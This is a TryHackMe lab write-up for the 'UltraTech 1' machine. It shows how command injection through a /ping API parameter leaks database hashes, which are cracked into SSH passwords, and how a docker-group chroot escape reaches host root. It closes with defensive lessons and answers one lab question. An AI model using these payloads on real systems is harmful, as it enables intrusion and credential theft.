# UltraTech 1 — TryHackMe Write-up

> **Platform:** TryHackMe
> **Machine:** UltraTech 1
> **Difficulty:** Medium
> **OS:** Linux
> **Target IP:** `10.48.148.77`
> **Attack Type:** Web Enumeration → API Enumeration → Command Injection → Credential Extraction → SSH → Docker Privilege Escalation → Host Root

---

## Table of Contents

* [1. Scenario](#1-scenario)
* [2. Initial Enumeration](#2-initial-enumeration)

  * [2.1 Full Port Scan](#21-full-port-scan)
  * [2.2 Service and Version Detection](#22-service-and-version-detection)
* [3. Web Enumeration](#3-web-enumeration)

  * [3.1 Port 31331](#31-port-31331)
  * [3.2 Port 8081](#32-port-8081)
  * [3.3 robots.txt](#33-robotstxt)
  * [3.4 JavaScript/API Analysis](#34-javascriptapi-analysis)
* [4. API Enumeration](#4-api-enumeration)
* [5. Command Injection](#5-command-injection)
* [6. Credential Extraction](#6-credential-extraction)
* [7. Initial Access via SSH](#7-initial-access-via-ssh)
* [8. Privilege Escalation](#8-privilege-escalation)

  * [8.1 Checking User and Groups](#81-checking-user-and-groups)
  * [8.2 Identifying Docker Access](#82-identifying-docker-access)
  * [8.3 Confirming Container Environment](#83-confirming-container-environment)
  * [8.4 Docker Escape](#84-docker-escape)
* [9. Getting Host Root](#9-getting-host-root)
* [10. Attack Chain](#10-attack-chain)
* [11. Lessons Learned](#11-lessons-learned)
* [12. Conclusion](#12-conclusion)

---

# 1. Scenario

We are given a grey-box penetration testing scenario where the only information provided is the company's name and the IP address of its server.

> **Target:** UltraTech
> **Target IP:** `10.48.148.77`

The objective is to enumerate the infrastructure, identify vulnerabilities, obtain initial access, and ultimately escalate privileges.

---

# 2. Initial Enumeration

I started with a full TCP port scan because only the target IP was provided.

## 2.1 Full Port Scan

```bash
nmap -p- --min-rate 5000 10.48.148.77
```

### Results

```text
Nmap scan report for 10.48.148.77
Host is up.

PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
8081/tcp  open  blackice-icecap
31331/tcp open  unknown
```

We have four open TCP ports:

| Port    | Service | Initial Interest                  |
| ------- | ------- | --------------------------------- |
| `21`    | FTP     | Possible anonymous access / files |
| `22`    | SSH     | Potential remote access           |
| `8081`  | HTTP    | REST API                          |
| `31331` | HTTP    | Main web application              |

The two HTTP services are particularly interesting, so I proceeded with service and version detection.

---

## 2.2 Service and Version Detection

```bash
nmap -sC -sV -p 21,22,8081,31331 10.48.148.77
```

### Results

```text
21/tcp    open  ftp     vsftpd 3.0.5

22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
                    Ubuntu Linux

8081/tcp  open  http    Node.js Express framework
                    http-title: Site doesn't have a title
                    http-methods: GET HEAD POST OPTIONS
                    http-cors: HEAD GET POST PUT DELETE PATCH

31331/tcp open  http    Apache httpd 2.4.41
                    Ubuntu
                    http-title: UltraTech - The best of technology
                    (AI, FinTech, Big Data)
```

The service on port `8081` is running an **Express/Node.js REST API**, while port `31331` hosts the main website.

At this point, the primary attack surface appears to be the web application and its API.

---

# 3. Web Enumeration

## 3.1 Port 31331

I opened the website hosted on:

```text
http://10.48.148.77:31331
```

The page identifies itself as:

> **UltraTech — The best of technology (AI, FinTech, Big Data)**

Since the application is a web service, I proceeded with directory and file enumeration.

---

## 3.2 Port 8081

The service on port `8081` behaves differently.

Opening:

```text
http://10.48.148.77:8081
```

reveals that it is an API rather than a traditional website.

The Nmap results also confirmed:

```text
Node.js Express framework
```

This immediately makes the API an interesting target because API endpoints can sometimes expose functionality that isn't directly linked from the main website.

---

# 3.3 robots.txt

I started enumeration of the main website by checking `robots.txt`.

```bash
curl http://10.48.148.77:31331/robots.txt
```

The response was:

```text
/
 /index.html
 /what.html
 /partners.html
```

This gave us several pages to investigate:

```text
/index.html
/what.html
/partners.html
```

These pages were then inspected manually.

---

# 3.4 JavaScript/API Analysis

While examining the website's JavaScript, I found an interesting piece of code responsible for communicating with the API.

```javascript
const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
```

This is an important discovery.

The website is making a request to:

```text
/ping?ip=
```

on the API running on port `8081`.

Therefore, we now know that the web application is directly using an API endpoint on port `8081`.

---

# 4. API Enumeration

The API endpoint discovered from the JavaScript was:

```text
http://10.48.148.77:8081/ping
```

The request takes an `ip` parameter:

```text
/ping?ip=<value>
```

For example:

```text
http://10.48.148.77:8081/ping?ip=127.0.0.1
```

The application appears to execute a ping command against the supplied input.

This immediately raises a potential **OS command injection** concern.

---

## API Routes Used by the Web Application

By examining the JavaScript and API functionality, the web application uses two API routes:

```text
/auth
/ping
```

Therefore, the answer to the TryHackMe question:

> **The software using port 8081 is a REST API. How many of its routes are used by the web application?**

is:

```text
2
```

The two routes are:

```text
/auth
/ping
```

---

# 5. Command Injection

The `/ping` endpoint accepts user-controlled input through the `ip` parameter.

The interesting request is:

```text
http://10.48.148.77:8081/ping?ip=<input>
```

Since the server appears to pass this value to the system's `ping` command, I tested whether shell metacharacters could alter command execution.

For example:

```text
`ls`
```

The server responded with an error similar to:

```text
ping: utech.db.sqlite: Name or service not known
```

This was interesting because the output was no longer simply related to an IP address.

The response indicated that additional data was being interpreted as part of the ping input.

---

## Testing Command Execution

I then experimented with command substitution.

One of the useful payloads was:

```text
`cat ...`
```

Eventually, the response revealed data from the application's SQLite database.

The output contained entries resembling:

```text
r00t
f357a0c52799563c7c7b76c1e7543a32

admin
0d0ea5111e3c1def594c1684e3b9be84
```

This strongly suggested that the application database contained user credentials or password hashes.

---

# 6. Credential Extraction

The database contents provided two interesting usernames and password hashes.

The credentials discovered were:

| Username | Hash                               |
| -------- | ---------------------------------- |
| `r00t`   | `f357a0c52799563c7c7b76c1e7543a32` |
| `admin`  | `0d0ea5111e3c1def594c1684e3b9be84` |

The hashes appeared to be MD5 hashes.

I attempted to crack them using a password-cracking service.

The resulting credentials were:

```text
r00t:n100906
admin:mrsheafy
```

The `r00t` account looked particularly interesting because it could potentially provide SSH access.

---

# 7. Initial Access via SSH

The SSH service was exposed on port `22`.

From the Nmap scan:

```text
22/tcp open ssh OpenSSH 8.2p1 Ubuntu
```

I attempted to authenticate using the recovered `r00t` credentials.

```bash
ssh r00t@10.48.148.77
```

Password:

```text
n100906
```

The credentials worked.

We now have an authenticated shell.

---

# 8. Privilege Escalation

After obtaining SSH access, I started enumerating the environment.

The first step was checking the current user and group memberships.

---

## 8.1 Checking User and Groups

```bash
id
```

Output:

```text
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

This is a very important finding.

The user `r00t` is a member of the:

```text
docker
```

group.

Membership in the Docker group is highly privileged because access to the Docker daemon can often be leveraged to interact with the host filesystem as root.

---

## 8.2 Identifying Docker Access

I checked whether Docker was available:

```bash
docker --version
```

The environment confirmed Docker functionality.

The current user could interact with Docker without requiring `sudo`.

This is a major privilege escalation opportunity.

---

# 8.3 Confirming Container Environment

Before attempting the escape, I checked the process control groups:

```bash
cat /proc/1/cgroup
```

The output included:

```text
13:perf_event:/
12:misc:/
11:cpuset:/
10:memory:/init.scope
9:cpu,cpuacct:/init.scope
8:net_cls,net_prio:/
7:pids:/init.scope
6:hugetlb:/
5:rdma:/
4:devices:/init.scope
3:freezer:/
2:blkio:/init.scope
1:name=systemd:/init.scope
0::/init.scope
```

The environment was running inside a Docker container.

So our situation was now:

```text
Internet
   |
   v
Web Application
   |
   v
Command Injection
   |
   v
Database Credentials
   |
   v
SSH Access
   |
   v
Docker Container
   |
   v
Docker Group
```

The next objective was to escape the container and access the underlying host.

---

# 8.4 Docker Escape

Because the `r00t` user had Docker permissions, we could create a privileged container with the host filesystem mounted inside it.

The following command was used:

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh
```

### What the command does

The important portion is:

```text
-v /:/mnt
```

This mounts the host's root filesystem at:

```text
/mnt
```

inside the newly created container.

Then:

```text
chroot /mnt
```

changes the apparent root directory to the mounted host filesystem.

Effectively, we gain access to the host's filesystem from inside the container.

---

# 9. Getting Host Root

After executing:

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh
```

the filesystem changed to the host's root filesystem.

Running:

```bash
ls
```

returned:

```text
bin
boot
dev
etc
home
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
initrd.img
initrd.img.old
swap.img
```

This is clearly the host's filesystem rather than the original restricted container filesystem.

I then started Bash:

```bash
/bin/bash
```

The shell reported:

```text
groups: cannot find name for group ID 11

To run a command as administrator (user "root"), use "sudo <command>".

root@7c567b054327:/#
```

Most importantly, our prompt had changed to:

```text
root@7c567b054327:/#
```

We had successfully obtained **root-level access to the host filesystem**.

---

# 10. Attack Chain

The complete attack chain can be summarized as follows:

```text
                         ┌──────────────────────┐
                         │   UltraTech Server   │
                         │    10.48.148.77      │
                         └──────────┬───────────┘
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │ Port Enumeration     │
                         │ 21 / 22 / 8081 /     │
                         │ 31331                │
                         └──────────┬───────────┘
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │ Web Enumeration      │
                         │ Port 31331           │
                         └──────────┬───────────┘
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │ JavaScript Analysis  │
                         │ /ping API discovered │
                         └──────────┬───────────┘
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │ Command Injection    │
                         │ /ping?ip=             │
                         └──────────┬───────────┘
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │ SQLite Database      │
                         │ Credentials leaked   │
                         └──────────┬───────────┘
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │ Password Cracking    │
                         │ r00t:n100906         │
                         │ admin:mrsheafy       │
                         └──────────┬───────────┘
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │ SSH                  │
                         │ r00t@target          │
                         └──────────┬───────────┘
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │ Docker Group         │
                         │ groups=...docker     │
                         └──────────┬───────────┘
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │ Docker Host Mount    │
                         │ -v /:/mnt            │
                         └──────────┬───────────┘
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │ chroot /mnt          │
                         └──────────┬───────────┘
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │       HOST ROOT      │
                         └──────────────────────┘
```

---

# 11. Lessons Learned

## 11.1 Always Perform Full Port Enumeration

A standard top-port scan would have missed the unusual services running on:

```text
8081
31331
```

A full TCP scan quickly revealed the complete exposed attack surface.

```bash
nmap -p- <target>
```

---

## 11.2 Don't Ignore JavaScript

The JavaScript source code revealed an API endpoint that wasn't immediately obvious from the main website.

The following code was particularly valuable:

```javascript
const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
```

Client-side JavaScript can reveal:

* API endpoints
* Internal functionality
* Parameters
* Authentication mechanisms
* Hidden routes
* Backend architecture

---

## 11.3 APIs Are Part of the Attack Surface

The API on port `8081` was not just an auxiliary service.

It provided functionality used by the main web application.

The two relevant routes were:

```text
/auth
/ping
```

Therefore, API enumeration should always be performed alongside normal web enumeration.

---

## 11.4 Command Injection Can Lead to Full Compromise

The vulnerable `/ping` endpoint accepted attacker-controlled input.

Because the input was ultimately interpreted by a system command, it allowed commands to be executed on the server.

That turned a simple ping functionality into a path toward:

```text
Command Execution
        ↓
Database Access
        ↓
Credential Extraction
        ↓
SSH Access
```

---

## 11.5 Never Store Passwords Using Weak Hashes

The database contained password hashes that could be cracked relatively easily.

MD5 should not be used for password storage.

Modern applications should use dedicated password hashing algorithms such as:

```text
Argon2id
bcrypt
scrypt
PBKDF2
```

with appropriate salts and configuration.

---

## 11.6 Docker Group Membership Is Highly Privileged

One of the most important privilege escalation lessons from this machine is:

```text
docker group ≈ highly privileged access
```

A user who can interact with the Docker daemon may be able to create containers with access to sensitive host resources.

In this case:

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh
```

allowed access to the host filesystem.

Therefore, Docker permissions should always be included in Linux privilege-escalation enumeration.

---

# 12. Conclusion

UltraTech 1 demonstrates how several individually small security weaknesses can be chained together into complete system compromise.

The initial attack surface consisted of:

```text
FTP
SSH
REST API
Web Application
```

The critical vulnerability was discovered by analyzing the application's JavaScript and identifying the `/ping` API endpoint.

From there, command injection allowed access to the application's SQLite database, exposing password hashes. After cracking the hashes, SSH access was obtained using the `r00t` account.

The final privilege escalation was made possible because the account belonged to the `docker` group. Docker access allowed the host filesystem to be mounted into a container and accessed through `chroot`, resulting in root-level access to the underlying host.

### Final Attack Path

```text
Port Scan
    ↓
Web Enumeration
    ↓
JavaScript Analysis
    ↓
API Discovery
    ↓
/ping Command Injection
    ↓
SQLite Database
    ↓
Credential Extraction
    ↓
Password Cracking
    ↓
SSH
    ↓
Docker Group
    ↓
Docker Host Filesystem Mount
    ↓
chroot
    ↓
ROOT
```

---

## Key Commands Used

```bash
# Full port scan
nmap -p- --min-rate 5000 10.48.148.77

# Service/version enumeration
nmap -sC -sV -p 21,22,8081,31331 10.48.148.77

# robots.txt
curl http://10.48.148.77:31331/robots.txt

# Check current user
id

# Check container environment
cat /proc/1/cgroup

# Docker host filesystem access
docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh

# Start bash after obtaining the host filesystem
/bin/bash
```

---

> **Takeaway:** Don't treat web applications, APIs, containers, and Linux privilege escalation as isolated areas. In a real penetration test, the most interesting compromises often come from chaining several seemingly minor weaknesses together.
